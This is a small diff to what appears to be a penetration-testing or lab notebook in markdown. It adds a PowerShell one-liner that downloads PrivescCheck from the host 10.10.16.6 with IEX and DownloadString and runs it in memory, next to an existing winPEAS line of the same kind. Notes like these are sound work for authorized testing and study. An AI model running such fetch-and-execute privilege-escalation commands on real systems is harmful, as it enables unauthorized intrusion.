@@ -58,4 +58,10 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/Auto/winPEA
 IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1')
 ```
 
-PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1
+
+```
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
+```
+
+![[Pasted image 20240924225659.png]]
+
